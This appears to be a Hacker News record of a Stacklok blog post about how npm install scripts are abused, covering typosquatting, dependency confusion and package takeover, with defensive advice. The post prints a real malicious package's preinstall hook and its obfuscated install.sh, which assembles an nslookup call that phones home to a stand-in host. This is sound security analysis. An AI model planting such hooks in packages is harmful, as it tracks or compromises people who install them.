{"aid": "39960544", "title": "NPM install scripts can be weaponized", "url": "https://stacklok.com/blog/how-npm-install-scripts-can-be-weaponized-a-real-life-example-of-a-harmful-npm-package", "domain": "stacklok.com", "votes": 1, "user": "bubblehack3r", "posted_at": "2024-04-07 13:14:19", "comments": 0, "source_title": "How npm install scripts can be weaponized: A real-world example of a harmful npm package", "source_text": "How npm install scripts can be weaponized: A real-world example of a harmful npm package | Stacklok\n\nHome\n\nProducts\n\nMinder\n\nOpen source platform to help owners and maintainers secure their software\n\nTrusty\n\nFree-to-use service to help developers make safer dependency choices\n\nCompany\n\nAbout\n\nCareers\n\nOpen Source\n\nPress\n\nResources\n\n### Resources\n\nBlog\n\nVideos\n\nTrusty Docs\n\nMinder Docs\n\nView all resources\n\n### Featured Content\n\nBlog\n\n#### The good, the bad and the ugly of the XZ vulnerability\n\nBlog\n\n#### How npm install scripts can be weaponized: A real-world example of a\nharmful npm package\n\n#### Software Supply Chain Security (S3C) Weekly\n\nExplore our weekly newsletter on software supply chain security, featuring\nincidents, tips, tools, and community updates. Powered by Stacklok.\n\nSubscribe Now\n\nContact\n\nJoin Discord\n\nHome\n\nProducts\n\nMinder Trusty\n\nCompany\n\nAbout Careers Open Source Press\n\nResources\n\nBlog Videos Trusty Docs Minder Docs View all resources\n\nContact\n\nStacklok On Twitter (X)\n\nStacklok On Github\n\nStacklok On LinkedIn\n\nStacklok On Discord\n\nStacklok On YouTube\n\n##### Blog\n\n# How npm install scripts can be weaponized: A real-world example of a harmful\nnpm package\n\nHow npm preinstall and postinstall scripts can serve as methods to inject\nmalicious code into open source packages.\n\nAuthor: Edward Thomson\n\n/\n\n10 mins read\n\n/\n\nMar 3, 2024\n\nCybersecurity\n\nAt the beginning of 2020, my boss at GitHub pulled me in to a surprise\nmeeting. \u201cI think that we\u2019re going to buy npm,\u201d he told me. \u201cThe npm registry\nkeeps growing, and the team managing it can\u2019t keep up. We want to make sure\nthat the npm registry stays online. Anyway, I want you to manage Product for\nnpm.\u201d\n\nUp until that point, like many \u2013 dare I say most \u2013 developers, I had used npm,\nbut I hadn\u2019t really thought deeply about it. I knew that if I wanted to\ninstall some package for Node.js, I ran npm install. I knew that I used npm as\na frontend \u2013 running npm run start or something like it \u2013 to actually execute\nmy Node.js apps. And I knew that npm had recently started alerting me when a\npackage in my dependency chain had a known vulnerability.\n\nAnd I also had a personal connection: there was a project called NodeGit that\nprovided a JavaScript interface to a project called libgit2, that I maintain.\nI had worked a bit with the team that wrote NodeGit, and I knew that when you\nran npm install, it would build a copy of libgit2 automatically.\n\nSo I knew that npm had a notion of \u201clifecycle scripts\u201d \u2013 including some that\ncould run during package installation. But as soon as I was faced with being\nresponsible for npm, I realized that there was a pretty significant risk here:\npeople wouldn\u2019t just publish packages with helpful scripts to the registry.\n\nAttackers could also put malicious scripts into the registry pretty easily,\nand if they convinced people to install their packages, could do some real\nharm.\n\nMany people, of course, had come to this realization long before me \u2013\nincluding, we quickly discovered, attackers. So one of the core investments\nthat GitHub made after acquiring npm was to improve its security posture. With\nthat investment, today the npm team mitigates many malicious packages before\nthey\u2019re even published, and the GitHub Trust and Safety team works diligently\nto take down risky packages promptly when they\u2019re discovered by security\nresearchers at organizations like Stacklok.\n\nAt Stacklok, we look at packages in the npm registry as part of our Trusty\nproduct, analyzing things like the activity and provenance so that our users\ncan make informed decisions about their dependencies. And we also find\npackages that do malicious things. Here\u2019s an example of one of the real-life\npackages that we\u2019ve discovered in the npm repository that exercise some\nharmful behavior.\n\n## An example of a malicious package\n\nThis is a slightly redacted version of a real package that was published to\nnpmjs.com and detected by researchers at Stacklok. This isn\u2019t the most\nmalicious package, but it makes an excellent example since it has a script\nthat is small, easy to understand, and shows some of the tactics that package\nauthors use to hide their intent. We\u2019ve only changed the package name and the\nhostname in this example to illustrate the methods without showing the exact\nhostname that was used to avoid giving the author unwanted attention.\n\nThe original package had a name that disguised its intent, and it included a\npackage.json that specified a preinstall script that would \u2013 by default \u2013 be\nexecuted when the package was installed. The preinstall script ran install.sh,\na shell script that was bundled with the package.\n\nJSON\n\n    \n    \n    { \u201cname\u201d: \u201cvery-trustyworthy-package\u201d, \u201cversion\u201d: \u201c0.0.42\u201d, \u201cscripts\u201d: { \u201cpreinstall\u201d: \u201csh install.sh\u201d } }\n\nShell (Bash)\n\n    \n    \n    #!/usr/bin/env sh echo \u201cStarting build...\" amount=ample former=ex organization=org install_a=nslo install_b=okup $install_a$install_b trustworthy-package.xyz.$former$amount.$organization >/dev/null echo \u201cBuild succeeded...\"\n\nLooking at the install.sh, it may take a moment to grasp what\u2019s going on here,\nbecause the install.sh script has been obfuscated. Fundamentally, the script\nsets some variables, then concatenates them to form a command:\n\nShell (Bash)\n\n    \n    \n    nslookup trustyworthy-package.xyz.example.org >/dev/null\n\nSo when you run npm install on this package, or on a package that claims this\npackage as a dependency, it will not actually perform any of the builds that\nit claims to do. Instead, it will do a DNS call, ultimately looking up\ntrustworthy-package.xyz.example.org. The owner of the xyz.example.org domain\ncan identify when someone does that DNS lookup, so they can know when someone\nhas installed their \u201ctrustyworthy package\u201d, and even some information about\nthat person, like their public IP address.\n\nIn other words, this package \u201cphones home\u201d to indicate that it was installed.\nThankfully, the package isn\u2019t downloading or installing any additional\nsoftware, or trying to turn our machines into a botnet. It also doesn\u2019t appear\nto be trying to exfiltrate any data from our computer or upload our source\ncode. But it does tell the attacker that we installed the package and they\ntricked us into running their script.\n\nIt\u2019s impossible to know exactly what the author\u2019s motivation was with\npublishing this package. This could be a package used by a security researcher\nas a proof of concept. When you monitor the npm registry, you quickly discover\nthat there are numerous packages published that are used to demonstrate\nproblems within an organization. This particular package may be used by a\npentester or red team to illustrate how a company's current setup makes them\nvulnerable to dependency confusion attacks.\n\nBut this could also be a \u201ccanary\u201d in an actual dependency confusion attack.\nThe author may have uploaded this package as a comparatively harmless\ndependency, and now they\u2019re trying to sneak it in to an organization. Maybe\nthey\u2019re doing some social engineering, or testing to see if someone will\ninstall it accidentally, through a typo. When someone does eventually install\nthe package, it will \u201cphone home\u201d to the author, who will then know that their\ncanary has made its way into somebody\u2019s software supply chain. The author can\nthen publish a newer version of the package that does exfiltrate some data.\n\nRegardless of their intent, we disclose these packages to the team that\nmanages the npm registry. Uploading malicious code is against the npm terms of\nservice, even when it\u2019s being used for research. The GitHub Trust and Safety\nteam reviews these reports and deletes the packages from the registry\npromptly.\n\n## How can install scripts be weaponized?\n\nA package with a malicious install script doesn\u2019t actually cause any harm\nuntil it's downloaded and installed so that the install script is actually\nexecuted. There are three common attacks that leverage npm\u2019s install scripts.\n\n  * Package takeover attacks occur when a malicious actor gains access to publish an existing package, either through the source code repository or being able to publish directly to a registry.\n\n  * Typosquatting attacks occur when a malicious actor publishes a package that has a name like a popular package, and relies on people mistyping (or misreading) a malicious package as if it were the package that they meant to install. For example, a malicious package named nextt might accidentally get installed by people meaning to run npm install next.\n\n  * Dependency confusion attacks target individual organizations with malicious packages that have the same name as their internal packages. These attacks require knowledge of the organization\u2019s internal packages and relies on the target\u2019s internal package registry being configured to \u201cfall back\u201d to server packages from the public registry. For example, imagine Duff Industries has a package named duff-telemetry@1.2.3 hosted on their internal package registry. An attacker may be able to publish a package named duff-telemetry@99.0.0 to the public registry, which will be served instead of the correct package since it has a higher version number.\n\nIn any of these situations, an attacker can execute arbitrary code on a\ntarget\u2019s machine.\n\n## When are install scripts useful?\n\nYou might be thinking that we should just get rid of install scripts\naltogether. But the preinstall and postinstall scripts are valuable for many\npackages.\n\nA clever use of an install script is in the Jakyll project, which is a simple\nstatic website generator. Jakyll contains a postinstall script that will\nbootstrap a GitHub Actions workflow for you. So when you install Jakyll,\nyou\u2019ll have a workflow that deploys your site to GitHub Pages without needing\nto set it up. This makes for a delightful developer experience.\n\npreinstall scripts are often used to install mandatory dependencies,\nparticularly by packages that interact with other applications or with native\nlibraries. As mentioned earlier, the NodeGit package is a set of JavaScript\n\u201cbindings\u201d for the libgit2 project, which is written in C. NodeGit includes\ninstall scripts that will try to download pre-built versions of libgit2 for\nyour system, and if they don\u2019t exist, will actually compile libgit2 on your\ncomputer.\n\nWithout being able to run the preinstall script to install the native\ndependency, NodeGit simply wouldn\u2019t work.\n\n## How to keep yourself safe\n\nThankfully, the GitHub has made significant investments in keeping the npm\nregistry safe and secure. For example, the registry now rejects publishes of\npackages that look like typosquatting attacks. But no effort can be perfect,\nso you should be thoughtful about the dependencies that you use.\n\nThe common guidance is that you should avoid installing code that you\u2019re not\nfamiliar with, whenever possible. And that is great advice, but it\u2019s not\nalways realistic because the average JavaScript project has over 500\ndependencies! So even if you carefully audit your direct dependencies, it\u2019s\nalmost impossible to audit all your dependencies\u2019 dependencies.\n\nOne option that can help is to run npm with the --ignore-scripts option. For\nexample: npm install --ignore-scripts next. This will ensure that none of the\npreinstall or postinstall scripts are run in next or in any of its\ndependencies. This will protect you from malicious packages that have\nmalicious preinstall or postinstall scripts. But it will also break some\npackages that need to legitimately download or build dependencies. So you\nshould be thoughtful about using this option.\n\nInstead of trying to solve these problems manually, you may want to use some\nautomated dependency analysis and enforcement. That\u2019s why we developed free-\nto-use tools like Trusty and Minder.\n\nTrusty by Stacklok can help you understand the health of your dependencies and\nthe potential risks in using new packages. Trusty is unique in that it looks\nat a package both independently, as well as with a holistic view of the\necosystem. Trusty looks at things like how often a package is being published,\nwho is contributing to it, and whether it\u2019s being developed with industry\nstandard best practices. All of the malicious packages that we\u2019ve detected\nhave very low Trusty Scores, most of them 0.0.\n\nYou can then use a tool like Minder by Stacklok to monitor these dependencies\nand how they fit in to your software development lifecycle (SDLC). For\nexample, you can configure Minder to examine pull requests coming in to your\nGitHub repository, look at new dependencies being added in PRs, and check the\nTrusty Score of those dependencies. Minder can then alert you, or even block a\npull request that introduces new dependencies with a low Trusty Score. This is\na low-friction way that allows you to analyze questionable dependencies before\nmerging the PR that introduces them.\n\nWith Trusty and Minder together, if a developer accidentally mistypes a\npackage name and succumbs to a typosquatting attack, it can be caught when the\npull request is opened, before it is integrated into your source tree.\n\n## In conclusion\n\nThere\u2019s been significant research into using install scripts as an attack\nvector, and thankfully, significant investment by the npm team into mitigating\nthat risk. Despite that, even in 2024, install scripts do represent a real\nrisk through package takeovers, typosquatting, and dependency confusion\nattacks.\n\nI encourage you to be thoughtful about the packages that you install, and to\nuse scanning and policy tools to help you combat those risks.\n\nEdward Thomson\n\nProduct Manager\n\nEdward is a product manager at Stacklok, overseeing product strategy for\nStacklok's products, Minder and Trusty. Prior to Stacklok, he was Director of\nProduct Management at Vercel, and a product manager at GItHub focused on\nGitHub Actions and npm.\n\nEdward Thomson On Twitter (X)\n\nEdward Thomson On Github\n\nEdward Thomson On LinkedIn\n\n#### What is software provenance, and how can it keep your software secure?\n\nLuke Hinds /\n\nJan 5, 2024\n\nContinue Reading\n\n#### 3 common malicious attacks on open source package managers\u2014and how\ndevelopers can avoid them\n\nStacklok /\n\nJan 25, 2024\n\nContinue Reading\n\n##### Newsletter\n\n## Stay in the loop\n\nSubscribe to our newsletter for the latest news about our products and about\nopen source supply chain security.\n\n\u00a9 2024 Stacklok\n\nPrivacy Policy\n\n##### Main Menu\n\nHome About Careers Contact\n\n##### Products\n\nTrusty Minder\n\n##### Resources\n\nAll Resources Blog Videos Trusty Docs Minder Docs\n\n##### Contact Us\n\nhello@stacklok.com\n\nStacklok On Twitter (X)\n\nStacklok On Github\n\nStacklok On LinkedIn\n\nStacklok On Discord\n\nStacklok On YouTube\n\n##### For Developers\n\n### Find and evaluate open source packages\n\nTrusty provides a free-to-use service with scoring and metrics about a\npackage\u2019s repo and author activity.\n\nGet Started with Trusty\n\n##### For Open Source Communitites\n\n### Secure and govern software projects\n\nMinder is an open source platform that helps project owners build more secure\nsoftware and prove that what they\u2019ve built is secure.\n\nGet Started with Minder\n\n##### For Developers\n\n### Find and evaluate open source packages\n\nTrusty provides a free-to-use service with scoring and metrics about a\npackage\u2019s repo and author activity.\n\nGet Started with Trusty\n\n##### For Open Source Communitites\n\n### Secure and govern software projects\n\nMinder is an open source platform that helps project owners build more secure\nsoftware and prove that what they\u2019ve built is secure.\n\nGet Started with Minder\n\n# Notice\n\nWe and selected third parties use cookies or similar technologies for\ntechnical purposes and, with your consent, for experience, measurement and\nmarketing (personalized ads) as specified in the cookie policy.\n\nWith respect to advertising, we and 838 selected third parties, may use\nprecise geolocation data, and identification through device scanning in order\nto store and/or access information on a device and process personal data like\nyour usage data for the following advertising purposes: personalised\nadvertising and content, advertising and content measurement, audience\nresearch and services development.\n\nYou can freely give, deny, or withdraw your consent at any time by accessing\nthe preferences panel. If you give consent, it will be valid only in this\ndomain. Denying consent may make related features unavailable.\n\nUse the \u201cAccept all\u201d button to consent. Use the \u201cReject all\u201d button or close\nthis notice to continue without accepting.\n\nPress again to continue 0/1\n\n", "frontpage": false}
